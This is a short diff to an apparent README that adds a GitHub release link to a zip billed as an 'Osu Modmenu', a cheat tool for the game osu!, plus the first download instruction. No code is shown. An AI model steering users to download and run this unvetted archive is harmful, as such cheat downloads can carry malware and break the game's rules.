@@ -1,4 +1,4 @@
-- # [Download Osu Modmenu]()
+- # [Download Osu Modmenu](https://github.com/Str1ngel/Osu-Freedom/releases/download/osu/Release.zip)
 
 - # Instructions
 - 1. Download zip
